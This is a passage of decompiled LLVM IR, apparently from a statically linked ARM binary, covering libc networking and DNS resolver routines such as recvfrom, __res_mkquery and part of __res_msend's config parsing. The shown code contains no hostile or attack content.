  uselistorder label %.thread5, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cd68, { 1, 0 }
  uselistorder label %dec_label_pc_cd1c, { 1, 0 }
  uselistorder label %bb256, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cc08, { 1, 0 }
}

define i32 @recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_d46c = call i32 @recvfrom()
  ret i32 %v0_d46c
}

define i32 @recvfrom() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v0_d47c = load i32, i32* @lr, align 4
  %v0_d480 = load i32, i32* @r1, align 4
  %v0_d488 = load i32, i32* @r2, align 4
  store i32 %v0_d488, i32* @lr, align 4
  store i32 %v0_d480, i32* @r2, align 4
  %v0_d49c = load i32, i32* @r0, align 4
  %v0_d4a0 = load i32, i32* @r3, align 4
  store i32 %v0_d488, i32* @r3, align 4
  %v7_d4b0 = call i32 @__syscall_cp(i32 292, i32 %v0_d49c, i32 %v0_d480, i32 %v0_d488, i32 %v0_d4a0, i32 %tmp3, i32 %tmp1)
  store i32 %v7_d4b0, i32* @r0, align 4
  %v0_d4b4 = call i32 @__syscall_ret()
  store i32 %v0_d47c, i32* @lr, align 4
  ret i32 %v0_d4b4

; uselistorder directives
  uselistorder i32 %v0_d488, { 1, 0, 2 }
}

define i32 @__res_mkquery(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-307 = alloca i32, align 4
  %stack_var_-320 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_d4c4 = load i32, i32* @r4, align 4
  store i32 %v3_d4c4, i32* %stack_var_-32, align 4
  %v6_d4c4 = load i32, i32* @r5, align 4
  %v9_d4c4 = load i32, i32* @r6, align 4
  %v12_d4c4 = load i32, i32* @r7, align 4
  %v15_d4c4 = load i32, i32* @r8, align 4
  %v18_d4c4 = load i32, i32* @sb, align 4
  %v21_d4c4 = load i32, i32* @sl, align 4
  %v25_d4c4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %tmp, i32* @r7, align 4
  %v2_d4cc = ptrtoint i32* %stack_var_-320 to i32
  store i32 %arg1, i32* @r6, align 4
  %v0_d4dc = load i32, i32* @r2, align 4
  store i32 %v0_d4dc, i32* @sl, align 4
  %v0_d4e0 = load i32, i32* @r3, align 4
  store i32 %v0_d4e0, i32* @sb, align 4
  %v3_d4e4 = call i32 @strnlen(i32 %tmp, i32 255)
  store i32 %v3_d4e4, i32* @r5, align 4
  %v2_d4e8 = icmp eq i32 %v3_d4e4, 0
  br i1 %v2_d4e8, label %thread-pre-split, label %dec_label_pc_d4f0

dec_label_pc_d4f0:                                ; preds = %entry
  %v1_d4f0 = load i32, i32* @r7, align 4
  %v2_d4f0 = add i32 %v1_d4f0, %v3_d4e4
  store i32 %v2_d4f0, i32* %r3.global-to-local, align 4
  %v1_d4f4 = add i32 %v2_d4f0, -1
  %v2_d4f4 = inttoptr i32 %v1_d4f4 to i8*
  %v3_d4f4 = load i8, i8* %v2_d4f4, align 1
  %v4_d4f4 = zext i8 %v3_d4f4 to i32
  store i32 %v4_d4f4, i32* %r3.global-to-local, align 4
  %v7_d4f8 = icmp eq i8 %v3_d4f4, 46
  br i1 %v7_d4f8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_d4f0
  %v2_d4fc = add i32 %v3_d4e4, -1
  store i32 %v2_d4fc, i32* @r5, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %dec_label_pc_d4f0, %bb
  %v0_d520 = phi i32 [ %v2_d4fc, %bb ], [ %v3_d4e4, %dec_label_pc_d4f0 ], [ 0, %entry ]
  %v2_d504 = icmp eq i32 %v0_d520, 0
  %storemerge.v = select i1 %v2_d504, i32 17, i32 18
  %storemerge = add i32 %v0_d520, %storemerge.v
  store i32 %storemerge, i32* @r8, align 4
  %v5_d518 = icmp slt i32 %tmp53, %storemerge
  %. = zext i1 %v5_d518 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp75 = icmp ugt i32 %v0_d520, 253
  br i1 %tmp75, label %.thread4, label %bb68

.thread4:                                         ; preds = %thread-pre-split
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d618

bb68:                                             ; preds = %thread-pre-split
  %v2_d528 = icmp eq i1 %v5_d518, false
  br i1 %v2_d528, label %dec_label_pc_d530, label %dec_label_pc_d618

dec_label_pc_d530:                                ; preds = %bb68
  %v0_d530 = load i32, i32* @sl, align 4
  %v2_d530 = icmp ugt i32 %v0_d530, 254
  %v7_d530 = icmp eq i32 %v0_d530, 255
  %v2_d534 = xor i1 %v2_d530, true
  %v3_d534 = or i1 %v7_d530, %v2_d534
  br i1 %v3_d534, label %bb69, label %bb70

bb69:                                             ; preds = %dec_label_pc_d530
  %v4_d534 = load i32, i32* @r6, align 4
  %v6_d534 = icmp ugt i32 %v4_d534, 14
  %v11_d534 = icmp eq i32 %v4_d534, 15
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_d530, %bb69
  %v0_d540 = phi i1 [ %v2_d530, %dec_label_pc_d530 ], [ %v6_d534, %bb69 ]
  %v1_d540 = phi i1 [ false, %dec_label_pc_d530 ], [ %v11_d534, %bb69 ]
  %v2_d538 = xor i1 %v0_d540, true
  %v3_d538 = or i1 %v1_d540, %v2_d538
  br i1 %v3_d538, label %bb71, label %bb72

bb71:                                             ; preds = %bb70
  store i32 0, i32* @r1, align 4
  br label %bb72

bb72:                                             ; preds = %bb70, %bb71
  %v2_d53c = xor i1 %v1_d540, true
  %v3_d53c = and i1 %v0_d540, %v2_d53c
  br i1 %v3_d53c, label %.thread46, label %dec_label_pc_d544

.thread46:                                        ; preds = %bb72
  br label %dec_label_pc_d618

dec_label_pc_d544:                                ; preds = %bb72
  %v0_d544 = load i32, i32* @sb, align 4
  %tmp76 = icmp ugt i32 %v0_d544, 255
  br i1 %tmp76, label %dec_label_pc_d618, label %dec_label_pc_d54c

dec_label_pc_d54c:                                ; preds = %dec_label_pc_d544
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v2_d4cc, i32* @r0, align 4
  %v0_d554 = call i32 @memset()
  %v0_d564 = load i32, i32* @r7, align 4
  store i32 1, i32* @r3, align 4
  %v0_d56c = load i32, i32* @r5, align 4
  store i32 %v0_d56c, i32* %r2.global-to-local, align 4
  %v3_d578 = bitcast i32* %stack_var_-307 to i16*
  %v4_d578 = call i32 @memcpy(i16* %v3_d578, i32 %v0_d564, i32 %v0_d56c)
  store i32 %v2_d4cc, i32* @r4, align 4
  store i32 %v25_d4c4, i32* %r2.global-to-local, align 4
  %v2_d5c019 = add i32 %v25_d4c4, 13
  store i32 %v2_d5c019, i32* %r3.global-to-local, align 4
  %v1_d5c420 = add i32 %v25_d4c4, -275
  %v2_d5c421 = inttoptr i32 %v1_d5c420 to i8*
  %v3_d5c422 = load i8, i8* %v2_d5c421, align 1
  %v2_d5c824 = icmp eq i8 %v3_d5c422, 0
  br i1 %v2_d5c824, label %dec_label_pc_d5d8, label %dec_label_pc_d58c.preheader.preheader

dec_label_pc_d58c.preheader.preheader:            ; preds = %dec_label_pc_d54c
  %v2_d5b0 = add i32 %v25_d4c4, -289
  br label %dec_label_pc_d58c.preheader

dec_label_pc_d588:                                ; preds = %.lr.ph
  %v1_d588 = add i32 %v0_d588, 1
  store i32 %v1_d588, i32* %r2.global-to-local, align 4
  %v1_d58c = inttoptr i32 %v0_d58c to i8*
  %v2_d58c = load i8, i8* %v1_d58c, align 1
  %v3_d58c = zext i8 %v2_d58c to i32
  store i32 %v3_d58c, i32* %r3.global-to-local, align 4
  %v2_d590 = icmp eq i8 %v2_d58c, 0
  br i1 %v2_d590, label %dec_label_pc_d59c, label %.lr.ph

.lr.ph:                                           ; preds = %dec_label_pc_d58c.preheader, %dec_label_pc_d588
  %v0_d58c.in = phi i32 [ %v0_d58c, %dec_label_pc_d588 ], [ %v3_d5cc, %dec_label_pc_d58c.preheader ]
  %v0_d588 = phi i32 [ %v1_d588, %dec_label_pc_d588 ], [ %v1_d5b0, %dec_label_pc_d58c.preheader ]
  %v1_d594 = phi i32 [ %v3_d58c, %dec_label_pc_d588 ], [ %v3_d58c16, %dec_label_pc_d58c.preheader ]
  %v0_d58c = add i32 %v0_d58c.in, 1
  %v8_d594 = icmp eq i32 %v1_d594, 46
  br i1 %v8_d594, label %dec_label_pc_d59c, label %dec_label_pc_d588

dec_label_pc_d59c:                                ; preds = %.lr.ph, %dec_label_pc_d588, %dec_label_pc_d58c.preheader
  %v1_d59c = phi i32 [ %v1_d5b0, %dec_label_pc_d58c.preheader ], [ %v0_d588, %.lr.ph ], [ %v1_d588, %dec_label_pc_d588 ]
  %v2_d59c = sub i32 %v1_d59c, %v1_d5b0
  %v1_d5a0 = add i32 %v2_d59c, -1
  store i32 %v1_d5a0, i32* %r3.global-to-local, align 4
  %tmp77 = icmp ugt i32 %v1_d5a0, 62
  br i1 %tmp77, label %dec_label_pc_d618, label %dec_label_pc_d5ac

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d59c
  %v1_d5b4 = trunc i32 %v2_d59c to i8
  %v3_d5b4 = add i32 %v2_d5b0, %v1_d5b0
  %v4_d5b4 = inttoptr i32 %v3_d5b4 to i8*
  store i8 %v1_d5b4, i8* %v4_d5b4, align 1
  %v0_d5b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d5b8 = add i32 %v0_d5b8, 1
  store i32 %v25_d4c4, i32* %r2.global-to-local, align 4
  %v2_d5c0 = add i32 %v1_d5b8, %v25_d4c4
  store i32 %v2_d5c0, i32* %r3.global-to-local, align 4
  %v1_d5c4 = add i32 %v2_d5c0, -288
  %v2_d5c4 = inttoptr i32 %v1_d5c4 to i8*
  %v3_d5c4 = load i8, i8* %v2_d5c4, align 1
  %v2_d5c8 = icmp eq i8 %v3_d5c4, 0
  br i1 %v2_d5c8, label %dec_label_pc_d5d8, label %dec_label_pc_d5ac._crit_edge

dec_label_pc_d5ac._crit_edge:                     ; preds = %dec_label_pc_d5ac
  %v1_d5cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d58c.preheader

dec_label_pc_d58c.preheader:                      ; preds = %dec_label_pc_d58c.preheader.preheader, %dec_label_pc_d5ac._crit_edge
  %v1_d5b0 = phi i32 [ %v1_d5b8, %dec_label_pc_d5ac._crit_edge ], [ 13, %dec_label_pc_d58c.preheader.preheader ]
  %v1_d5cc = phi i32 [ %v1_d5cc.pre, %dec_label_pc_d5ac._crit_edge ], [ %v2_d4cc, %dec_label_pc_d58c.preheader.preheader ]
  %v3_d5cc = add i32 %v1_d5cc, %v1_d5b0
  store i32 %v1_d5b0, i32* %r2.global-to-local, align 4
  %v1_d58c14 = inttoptr i32 %v3_d5cc to i8*
  %v2_d58c15 = load i8, i8* %v1_d58c14, align 1
  %v3_d58c16 = zext i8 %v2_d58c15 to i32
  store i32 %v3_d58c16, i32* %r3.global-to-local, align 4
  %v2_d59018 = icmp eq i8 %v2_d58c15, 0
  br i1 %v2_d59018, label %dec_label_pc_d59c, label %.lr.ph

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d5ac, %dec_label_pc_d54c
  %v2_d5dc = phi i32 [ %v2_d5c019, %dec_label_pc_d54c ], [ %v2_d5c0, %dec_label_pc_d5ac ]
  %v4_d5c4.lcssa.in = phi i8 [ %v3_d5c422, %dec_label_pc_d54c ], [ %v3_d5c4, %dec_label_pc_d5ac ]
  %v4_d5c4.lcssa = zext i8 %v4_d5c4.lcssa.in to i32
  %v2_d5d8 = ptrtoint i32* %stack_var_-40 to i32
  %v0_d5dc = load i32, i32* @sl, align 4
  %v1_d5dc = trunc i32 %v0_d5dc to i8
  %v3_d5dc = add i32 %v2_d5dc, -285
  %v4_d5dc = inttoptr i32 %v3_d5dc to i8*
  store i8 %v1_d5dc, i8* %v4_d5dc, align 1
  %v0_d5e0 = load i32, i32* @sb, align 4
  %v1_d5e0 = trunc i32 %v0_d5e0 to i8
  %v2_d5e0 = load i32, i32* %r3.global-to-local, align 4
  %v3_d5e0 = add i32 %v2_d5e0, -287
  %v4_d5e0 = inttoptr i32 %v3_d5e0 to i8*
  store i8 %v1_d5e0, i8* %v4_d5e0, align 1
  %v2_d5e4 = call i32 @__clock_gettime(i32 %v4_d5c4.lcssa, i32 %v2_d5d8)
  %v4_d5ec = udiv i32 %tmp50, 65536
  %v5_d5ec = add i32 %v4_d5ec, %tmp50
  %v3_d5f4 = urem i32 %v5_d5ec, 65536
  store i32 %v3_d5f4, i32* @r3, align 4
  %v3_d5f8 = udiv i32 %v3_d5f4, 256
  store i32 %v3_d5f8, i32* @ip, align 4
  %v0_d604 = load i32, i32* @r8, align 4
  store i32 %v0_d604, i32* %r2.global-to-local, align 4
  store i32 %v3_d5f8, i32* %stack_var_-320, align 4
  %v3_d610 = inttoptr i32 %tmp49 to i16*
  %v4_d610 = call i32 @memcpy(i16* %v3_d610, i32 %v2_d4cc, i32 %v0_d604)
  %v0_d61c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d61c

dec_label_pc_d618:                                ; preds = %dec_label_pc_d59c, %.thread46, %.thread4, %bb68, %dec_label_pc_d544
  br label %dec_label_pc_d61c

dec_label_pc_d61c:                                ; preds = %dec_label_pc_d5d8, %dec_label_pc_d618
  %v0_d61c = phi i32 [ %v0_d61c.pre, %dec_label_pc_d5d8 ], [ -1, %dec_label_pc_d618 ]
  store i32 %v6_d4c4, i32* @r5, align 4
  store i32 %v9_d4c4, i32* @r6, align 4
  store i32 %v12_d4c4, i32* @r7, align 4
  store i32 %v15_d4c4, i32* @r8, align 4
  store i32 %v18_d4c4, i32* @sb, align 4
  store i32 %v21_d4c4, i32* @sl, align 4
  ret i32 %v0_d61c

; uselistorder directives
  uselistorder i32 %v3_d5f8, { 1, 0 }
  uselistorder i32 %v3_d58c16, { 1, 0 }
  uselistorder i32 %v3_d5cc, { 1, 0 }
  uselistorder i32 %v1_d5b0, { 5, 1, 0, 3, 4, 2 }
  uselistorder i32 %v1_d5b8, { 1, 0 }
  uselistorder i1 %v0_d540, { 1, 0 }
  uselistorder i32 %v4_d534, { 1, 0 }
  uselistorder i1 %v2_d530, { 1, 0 }
  uselistorder i32 %v0_d530, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v3_d4e4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_d4cc, { 1, 0, 2, 3 }
  uselistorder i32 %v25_d4c4, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 7, 3, 1, 2, 9, 4, 0, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 0, 3, 4, 2, 1, 6, 5 }
  uselistorder i32 (i32, i32)* @strnlen, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d61c, { 1, 0 }
  uselistorder label %dec_label_pc_d618, { 0, 4, 1, 3, 2 }
  uselistorder label %dec_label_pc_d58c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d59c, { 2, 0, 1 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %thread-pre-split, { 2, 1, 0 }
}

define i32 @cleanup() local_unnamed_addr {
entry:
  %v1_d63c = load i32, i32* @r0, align 4
  ret i32 %v1_d63c
}

define i32 @mtime(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v2_d644 = ptrtoint i32* %stack_var_-16 to i32
  %v2_d650 = call i32 @__clock_gettime(i32 0, i32 %v2_d644)
  %v2_d65c = sdiv i32 %tmp, 1000000
  %v2_d660 = load i32, i32* %stack_var_-16, align 4
  %v3_d668 = mul i32 %v2_d660, 1000
  %v4_d668 = add i32 %v3_d668, %v2_d65c
  ret i32 %v4_d668
}

define i32 @__res_msend(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp140 = call i32 @__decompiler_undefined_function_0()
  %tmp149 = call i8 @__decompiler_undefined_function_3()
  %tmp150 = call i8 @__decompiler_undefined_function_3()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-185 = alloca i32, align 4
  %stack_var_-132 = alloca i16, align 2
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-680 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v9_d67c = load i32, i32* @r6, align 4
  %v15_d67c = load i32, i32* @r8, align 4
  %v18_d67c = load i32, i32* @sb, align 4
  %v24_d67c = load i32, i32* @fp, align 4
  %v27_d67c = load i32, i32* @lr, align 4
  store i32 0, i32* @r1, align 4
  store i32 28, i32* @r2, align 4
  %v2_d698 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_d698, i32* @r0, align 4
  %v2_d69c = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_d69c, i32* @r4, align 4
  %v0_d6a4 = call i32 @memset()
  store i32 84, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v2_d69c, i32* @r0, align 4
  %v0_d6b4 = call i32 @memset()
  %v2_d6b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d6b8, i32* %r1.global-to-local, align 4
  %v3_d6c0 = call i32 @__pthread_setcancelstate(i32 1, i32* nonnull %stack_var_-44)
  %v2_d6c8 = ptrtoint i32* %stack_var_-424 to i32
  store i32 %v2_d6c8, i32* %r1.global-to-local, align 4
  %v2_d6cc = ptrtoint i32* %stack_var_-680 to i32
  store i32 256, i32* %r3.global-to-local, align 4
  %v7_d6d4 = call i32 @__fopen_rb_ca(i32 ptrtoint ([17 x i8]* @global_var_19cfc.495 to i32), i32* nonnull %stack_var_-424, i32 %v2_d6cc, i32 256, i32 ptrtoint (i32* @0 to i32))
  %v2_d6d8 = icmp eq i32 %v7_d6d4, 0
  br i1 %v2_d6d8, label %dec_label_pc_d964, label %dec_label_pc_d6e4

dec_label_pc_d6e4:                                ; preds = %entry
  store i32 2, i32* @fp, align 4
  %v2_d6f0 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_d6f0, i32* @sl, align 4
  %v2_d6f8 = ptrtoint i16* %stack_var_-132 to i32
  store i32 %v2_d6f8, i32* %r3.global-to-local, align 4
  %v2_d704 = ptrtoint i32* %stack_var_-185 to i32
  store i32 2, i32* @r8, align 4
  %v2_d70c = ptrtoint i32* %stack_var_-124 to i32
  store i32 %v2_d70c, i32* @sb, align 4
  %v3_d954 = bitcast i32* %stack_var_-196 to i8*
  %v4_d734 = zext i8 %tmp150 to i32
  %v1_d738 = add nsw i32 %v4_d734, -9
  %v7_d73c = icmp eq i8 %tmp150, 32
  %v2_d7d0 = ptrtoint i32* %stack_var_-48 to i32
  %v4_d818 = zext i8 %tmp149 to i32
  %v1_d81c = add nsw i32 %v4_d818, -9
  %v7_d820 = icmp eq i8 %tmp149, 32
  %v2_d8d0 = ptrtoint i32* %stack_var_-40 to i32
  %tmp = icmp ugt i32 %v1_d738, 4
  %v2_d8b4 = add i32 %v2_d69c, 4
  %v1_d8f8 = add i32 %v2_d69c, 8
  %tmp214 = icmp ult i32 %v1_d81c, 5
  br label %dec_label_pc_d948

dec_label_pc_d71c:                                ; preds = %dec_label_pc_d948
  store i32 ptrtoint ([8 x i8]* @global_var_19d10.498 to i32), i32* %r1.global-to-local, align 4
  %v5_d728 = call i32 @strncmp(i8* %v3_d954, i32 ptrtoint ([8 x i8]* @global_var_19d10.498 to i32), i32 7)
  %v2_d72c = icmp eq i32 %v5_d728, 0
  br i1 %v2_d72c, label %dec_label_pc_d734, label %bb195

dec_label_pc_d734:                                ; preds = %dec_label_pc_d71c
  store i32 %v1_d738, i32* %r3.global-to-local, align 4
  br i1 %v7_d73c, label %dec_label_pc_d748, label %bb

bb:                                               ; preds = %dec_label_pc_d734
  br i1 %tmp, label %bb195, label %dec_label_pc_d748

dec_label_pc_d748:                                ; preds = %dec_label_pc_d734, %bb
  store i32 ptrtoint ([9 x i8]* @global_var_19d18.500 to i32), i32* %r1.global-to-local, align 4
  %v4_d750 = call i32 @strstr(i32 %v2_d6f0, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19d18.500, i32 0, i32 0))
  %v2_d754 = icmp eq i32 %v4_d750, 0
  br i1 %v2_d754, label %bb192, label %dec_label_pc_d75c

dec_label_pc_d75c:                                ; preds = %dec_label_pc_d748
  %v1_d75c = add i32 %v4_d750, 8
  %v2_d75c = inttoptr i32 %v1_d75c to i8*
  %v3_d75c = load i8, i8* %v2_d75c, align 1
  %v4_d75c = zext i8 %v3_d75c to i32
  %v1_d760 = add nsw i32 %v4_d75c, -48
  store i32 %v1_d760, i32* %r3.global-to-local, align 4
  store i32 %v1_d75c, i32* @r4, align 4
  %tmp215 = icmp ugt i32 %v1_d760, 9
  br i1 %tmp215, label %bb192, label %dec_label_pc_d770

dec_label_pc_d770:                                ; preds = %dec_label_pc_d75c
  store i32 %v1_d75c, i32* @r0, align 4
  store i32 %v2_d7d0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v3_d77c = call i32 @strtoul(i32 %v1_d75c, i32 %v2_d7d0, i32 10)
  %v3_d780 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d780, i32* %r3.global-to-local, align 4
  %v1_d784 = load i32, i32* @r4, align 4
  %v9_d784 = icmp eq i32 %v3_d780, %v1_d784
  br i1 %v9_d784, label %bb192, label %dec_label_pc_d78c

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d770
  %v2_d78c = icmp ugt i32 %v3_d77c, 28
  %v7_d78c = icmp eq i32 %v3_d77c, 29
  %v2_d790 = xor i1 %v2_d78c, true
  %v3_d790 = or i1 %v7_d78c, %v2_d790
  br i1 %v3_d790, label %bb189, label %.thread120

bb189:                                            ; preds = %dec_label_pc_d78c
  %v6_d794 = mul i32 %v3_d77c, 1000
  store i32 %v6_d794, i32* @r2, align 4
  br label %.thread120

.thread120:                                       ; preds = %dec_label_pc_d78c, %bb189
  %v2_d798 = xor i1 %v7_d78c, true
  %v3_d798 = and i1 %v2_d78c, %v2_d798
  br i1 %v3_d798, label %bb190, label %._crit_edge

._crit_edge:                                      ; preds = %.thread120
  %v4_d7a0.pre = load i32, i32* @ip, align 4
  br label %bb191

bb190:                                            ; preds = %.thread120
  br label %bb191

bb191:                                            ; preds = %._crit_edge, %bb190
  %v4_d7a0 = phi i32 [ %v4_d7a0.pre, %._crit_edge ], [ 30000, %bb190 ]
  %v4_d79c = load i32, i32* @r2, align 4
  %v4_d79c.stack_var_-704.3 = select i1 %v3_d790, i32 %v4_d79c, i32 %stack_var_-704.3
  %v4_d7a0.v4_d79c.stack_var_-704.3 = select i1 %v3_d798, i32 %v4_d7a0, i32 %v4_d79c.stack_var_-704.3
  br label %bb192

bb192:                                            ; preds = %bb191, %dec_label_pc_d770, %dec_label_pc_d75c, %dec_label_pc_d748
  %stack_var_-704.1 = phi i32 [ %stack_var_-704.3, %dec_label_pc_d748 ], [ %stack_var_-704.3, %dec_label_pc_d75c ], [ %stack_var_-704.3, %dec_label_pc_d770 ], [ %v4_d7a0.v4_d79c.stack_var_-704.3, %bb191 ]
  store i32 ptrtoint ([10 x i8]* @global_var_19d24.503 to i32), i32* %r1.global-to-local, align 4
  %v4_d7ac = call i32 @strstr(i32 %v2_d6f0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19d24.503, i32 0, i32 0))
  %v2_d7b0 = icmp eq i32 %v4_d7ac, 0
  br i1 %v2_d7b0, label %bb195, label %dec_label_pc_d7b8

dec_label_pc_d7b8:                                ; preds = %bb192
  %v1_d7b8 = add i32 %v4_d7ac, 9
  %v2_d7b8 = inttoptr i32 %v1_d7b8 to i8*
  %v3_d7b8 = load i8, i8* %v2_d7b8, align 1
  %v4_d7b8 = zext i8 %v3_d7b8 to i32
  %v1_d7bc = add nsw i32 %v4_d7b8, -48
  store i32 %v1_d7bc, i32* %r3.global-to-local, align 4
  store i32 %v1_d7b8, i32* @r4, align 4
  %tmp216 = icmp ugt i32 %v1_d7bc, 9
  br i1 %tmp216, label %bb195, label %dec_label_pc_d7cc

dec_label_pc_d7cc:                                ; preds = %dec_label_pc_d7b8
  store i32 %v1_d7b8, i32* @r0, align 4
  store i32 %v2_d7d0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v3_d7d8 = call i32 @strtoul(i32 %v1_d7b8, i32 %v2_d7d0, i32 10)
  %v3_d7dc = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d7dc, i32* %r3.global-to-local, align 4
  %v1_d7e0 = load i32, i32* @r4, align 4
  %v9_d7e0 = icmp eq i32 %v3_d7dc, %v1_d7e0
  br i1 %v9_d7e0, label %bb195, label %dec_label_pc_d7e8

dec_label_pc_d7e8:                                ; preds = %dec_label_pc_d7cc
  %v2_d7e8 = icmp ugt i32 %v3_d7d8, 9
  br i1 %v2_d7e8, label %.thread4, label %bb193

.thread4:                                         ; preds = %dec_label_pc_d7e8
  store i32 10, i32* %r3.global-to-local, align 4
  br label %.thread8

bb193:                                            ; preds = %dec_label_pc_d7e8
  store i32 %v3_d7d8, i32* %r3.global-to-local, align 4
  %v2_d7f4 = icmp eq i32 %v3_d7d8, 0
  br i1 %v2_d7f4, label %bb194, label %.thread8

.thread8:                                         ; preds = %bb193, %.thread4
  %v1_d7f89 = phi i32 [ %v3_d7d8, %bb193 ], [ 10, %.thread4 ]
  store i32 %v1_d7f89, i32* @fp, align 4
  br label %bb195

bb194:                                            ; preds = %bb193
  store i32 1, i32* @fp, align 4
  br label %bb195

bb195:                                            ; preds = %.thread8, %dec_label_pc_d71c, %dec_label_pc_d7cc, %dec_label_pc_d7b8, %bb192, %bb, %bb194
  %stack_var_-704.2 = phi i32 [ %stack_var_-704.3, %bb ], [ %stack_var_-704.1, %bb192 ], [ %stack_var_-704.1, %dec_label_pc_d7b8 ], [ %stack_var_-704.1, %dec_label_pc_d7cc ], [ %stack_var_-704.1, %bb194 ], [ %stack_var_-704.3, %dec_label_pc_d71c ], [ %stack_var_-704.1, %.thread8 ]
  store i32 ptrtoint ([11 x i8]* @global_var_19d30.505 to i32), i32* %r1.global-to-local, align 4
  %v4_d80c = call i32 @strncmp(i8* %v3_d954, i32 ptrtoint ([11 x i8]* @global_var_19d30.505 to i32), i32 10)
  %v2_d810 = icmp eq i32 %v4_d80c, 0
  br i1 %v2_d810, label %dec_label_pc_d818, label %dec_label_pc_d93c

dec_label_pc_d818:                                ; preds = %bb195
  store i32 %v1_d81c, i32* %r3.global-to-local, align 4
  br i1 %v7_d820, label %dec_label_pc_d838, label %bb196

bb196:                                            ; preds = %dec_label_pc_d818
  br i1 %tmp214, label %dec_label_pc_d838, label %dec_label_pc_d93c

dec_label_pc_d834:                                ; preds = %dec_label_pc_d838, %bb197
  %v1_d834 = add i32 %storemerge139, 1
  br label %dec_label_pc_d838

dec_label_pc_d838:                                ; preds = %bb196, %dec_label_pc_d818, %dec_label_pc_d834
  %storemerge139 = phi i32 [ %v1_d834, %dec_label_pc_d834 ], [ %v2_d704, %dec_label_pc_d818 ], [ %v2_d704, %bb196 ]
  store i32 %storemerge139, i32* @r1, align 4
  %v1_d838 = inttoptr i32 %storemerge139 to i8*
  %v2_d838 = load i8, i8* %v1_d838, align 1
  %v3_d838 = zext i8 %v2_d838 to i32
  %v1_d83c = add nsw i32 %v3_d838, -9
  store i32 %v1_d83c, i32* %r3.global-to-local, align 4
  %v7_d840 = icmp eq i8 %v2_d838, 32
  br i1 %v7_d840, label %dec_label_pc_d834, label %bb197

bb197:                                            ; preds = %dec_label_pc_d838
  %tmp217 = icmp ult i32 %v1_d83c, 5
  br i1 %tmp217, label %dec_label_pc_d834, label %dec_label_pc_d858.preheader

dec_label_pc_d858.preheader:                      ; preds = %bb197
  %v2_d85866 = load i8, i8* %v1_d838, align 1
  %v3_d85867 = zext i8 %v2_d85866 to i32
  store i32 %v3_d85867, i32* %r3.global-to-local, align 4
  %v2_d85c68 = icmp eq i8 %v2_d85866, 0
  br i1 %v2_d85c68, label %dec_label_pc_d874, label %dec_label_pc_d868

dec_label_pc_d854:                                ; preds = %bb198
  %v1_d854 = add i32 %v0_d854, 1
  %v1_d858 = inttoptr i32 %v1_d854 to i8*
  %v2_d858 = load i8, i8* %v1_d858, align 1
